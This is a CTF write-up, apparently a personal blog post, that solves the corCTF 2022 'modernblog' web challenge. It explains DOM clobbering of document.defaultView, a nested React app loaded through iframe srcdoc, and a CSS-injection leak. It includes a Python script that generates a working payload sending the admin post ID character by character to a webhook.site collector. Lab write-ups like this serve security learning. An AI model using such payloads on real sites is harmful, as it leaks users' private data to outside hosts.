After day by day, I'm finally able to fully understand the **modernblog** challenge :D This is a so amazing web challenge written in React.

It is worth to take a notice that I cannot solve this challenge by my own. What I did is reading the [author writeup](https://brycec.me/posts/corctf_2022_challenges#modernblog), demo the described techniques, and learn much from that! This write up is just like a notes of my understanding, my gainings after that process (and it may be a little bit difference the author writeup, since I wrote on my own understanding and viewpoint :D).

# 3. modernblog

## a. Challenge description

![image.png](https://images.viblo.asia/a7a1deed-2899-4353-b4fa-435f6069121d.png)

Look at the Admin Bot, we can definitely that this is client-side challenge. The source is React + Express backend, and most of the code is used for credentials management, and content management (creating, view blog content). The point is there are blog of admin containing the flag, with a randomId.

```js
(() => {
    const flagId = crypto.randomBytes(6).toString("hex");
    const flag = process.env.FLAG || "flag{test_flag}";
    users.set("admin", {
        pass: sha256(process.env.ADMIN_PASSWORD || "test_password"),
        posts: Object.freeze([flagId]),
    });
    posts.set(flagId, {
        id: flagId,
        title: "Flag",
        body: flag,
    });
})();
```

Since we can view any post given the id known (or the access link), the point is to get the `flagId`, or admin account takeover. And, as I state, this is a client-side challenge, so we have to take a look at the client side code to see where the vulnerability occurs: it is the `body` of a post

```js
<Stack
  spacing={4}
  w="full"
  maxW="md"
  bg={useColorModeValue("gray.50", "gray.700")}
  rounded="xl"
  boxShadow="2xl"
  p={6}
  my={12}
>
  <Heading lineHeight={1.1} fontSize={{ base: "2xl", md: "3xl" }}>
    {title}
  </Heading>

  {/* CSP is on, so this should be fine, right? */}
  {/* Clueless */}
  <div dangerouslySetInnerHTML={{ __html: body }}></div>
</Stack>

<Button variant="link" as={Link} to="/home">
  Back
</Button>
</Stack>
```

Let's move to the analysis phase to see how could we exploit this spot :D

## b. Challenge analysis

The first thing I can think of is XSS to account take over. However, as the comment says, there is CSP set at server.
![image.png](https://images.viblo.asia/7f8a240d-febd-414d-b567-96e91e193c63.png)

According to the CSP, there is no room for our custom script to run on the website, which means the account takeover approach is impossible. 

At this point, there is only 1 option left: get the `flagId` of the admin post, which is in `/home` page of admin user!

However, it does not directly HTML encode special characters, so we still can inject markup, HTML, CSS. But what we can do with this? What about CSS Injection / XS-leak? We can inject CSS into the post body, but it will execute on post page, while the `flagId` is in the `/home` page 🙃 So, what else we can do with HTML and CSS?

Just hold down a little bit. Although we can't execute our custom script, is that means we have no control over JS execution of the web? The answer is **NO**! We can do that with DOM clobbering attack.

### [Advanced] DOM clobbering

DOM clobbering is a well-known attack to change a value of `window` properties. For example:

![image.png](https://images.viblo.asia/b62272a9-f741-4be0-a484-9e8686f841d0.png)

However, reading the author writeup, I now know that DOM clobbering is only able to the the value of `window` properties, but also `document` properties! The key point is here

> So, the first point tells us that for any exposed **embed**, **form**, **iframe**, **img**, or **exposed object element**, the value of the “name” attribute will be a property of the Document object.

Let's take a demo to see that behavior:

![image.png](https://images.viblo.asia/972b3020-ecd7-430c-b5e4-f2ad52e68866.png)

Okay, but how to use this technique to solve the **modernblog** challenge? To use this, we need to answer a critical question:

> What property needed to be changed in order to change behavior of the **modernblog** web app?

To figure out that property, we need to understand the  how the web app works in depth. And, it will lead us to me to React Router!

### BrowserRouter

At the `main.jsx` file, we can see this application is route using the BrowserRouter. It actually a single page application, and it will choose which page to render based the `path` property.

```js
ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <ChakraProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/register" element={<Register />} />
          <Route path="/login" element={<Login />} />
          <Route path="/home" element={<Home />} />
          <Route path="/post/:id" element={<Post />} />
        </Routes>
      </BrowserRouter>
    </ChakraProvider>
  </React.StrictMode>
);
```

Take a look at BrowserRouter [doc](https://reactrouter.com/docs/en/v6/routers/browser-router), 
there is a line worth noticing

> <BrowserRouter window> defaults to using the current document's defaultView, but it may also be used to track changes to another window's URL, in an <iframe>
    
 That is, `document.defaultView`, right? 
    
The doc also state that `BrowserRouter` "browse using the built-in history stack", so taking a look at the History API can help us confirm whether `document.defaultView` is what we are looking for. And it is!

![image.png](https://images.viblo.asia/ac7a98de-fdd9-4155-8329-2aa994faf942.png)
    
At this point, we know that the key point of this challenge is the `document.defaultView` property. Let's test DOM clobbering payload at the **modernblog** website whether it work or not.
    
![image.png](https://images.viblo.asia/1e5c1361-ea5f-4dab-bc6f-5c6c436146c9.png)
    
Isn't that magic :D It clobbered! With that, we can now open the `/home` page, and perform CSS Injection to leak the `flagId`!
    
But, how to make the `createBrowserHistory` run again? If not so, there is no `/home` page loaded, hence no bit leaked.
    
🙃

The `createBrowserHistory` only run when the application load, but we can't make the **modernblog** web reload. Even if we could do, we would not like to do this as our payload will go! 
    
That go to a super cool idea of this challenge: **create a React app inside a React app** 🤯

### React in React
    
We can use the `srcdoc` attribute of the `iframe` tag to create another React app, using the provided public JS file. Let's try it:

```html
<iframe srcdoc="
<!DOCTYPE html>
<html>
  <head>
    <script type='module' crossorigin src='/assets/index.7352e15a.js'></script>
  </head>
  <body>
    <div id='root'></div>
  </body>
</html>
"></iframe>
```

    
![image.png](https://images.viblo.asia/da2cb05a-cb3b-453c-8770-69ed8827c2bd.png)
    
We get an error, as it fails to change `document.defaultview.History` while it is currently pointing to the current window int `about:srcdoc`. But, if we combine if React gadget, we got the following:
    
```js
<iframe srcdoc="
<!DOCTYPE html>
<html>
  <head>
	<style> * {color : red} </style>
    <script type='module' crossorigin src='/assets/index.7352e15a.js'></script>
  </head>
  <body>
    <div id='root'></div>
	<iframe name='defaultView' src='/home'></iframe>
  </body>
</html>
"></iframe>
````

![image.png](https://images.viblo.asia/a612f377-6e4b-4cbe-b353-0792b555a035.png)
    
The text color is red, and the content is exactly of the `/home` page. We finally reach the point! Load the `/home` page, inject CSS to leak the `flagId` bit by bit to get the flag!!!!!!!!!

## c. Challenge solution
    
Based on the above analysis, we now can use classical CSS techniques to leak the `flagId`. Using the script generated by the python code below, then create a blog whose body of it, and get each character of `flagId` at webhook:
    
```python
WEBHOOK = "https://webhook.site/"
alphabet = "01234556789abcdef"
known = ""

css = ""

for c in alphabet:
    query = known + c
    css += f"""a[href^='/post/{query}'] {{
    background-image: url('{WEBHOOK}?{query}')
}}
"""
payload = """<iframe srcdoc="
<!DOCTYPE html>
<html>
  <head>
    <style>
    """ + css + """
    </style>
    <script type='module' crossorigin src='/assets/index.7352e15a.js'></script>
  </head>
  <body>
    <iframe name='defaultView' src='/home'></iframe>
    <div id='root'></div>
  </body>
</html>
" style='width:50vw; height: 50vh'></iframe>"""

with open('payload.txt', 'w') as f:
    f.write(payload)
```
    
Attempt 12 times to get the full `flagId`, and the flag!

![image.png](https://images.viblo.asia/439211a7-16a3-4c9b-a477-911d66e0a1a3.png)
    
![image.png](https://images.viblo.asia/26d0d8e6-e7f2-464a-b471-a3ad0c5a9256.png)
    
At the end of the day, I learn a lot from this challenge, I also found another [CVE chain](https://www.hackthebox.com/blog/UNI-CTF-21-complex-web-exploit-chain-0day-bypass-impossible-CSP) to study from Strelic :D. Thanks so much for wonderful efforts making interesting challenges and writing inspring writeup!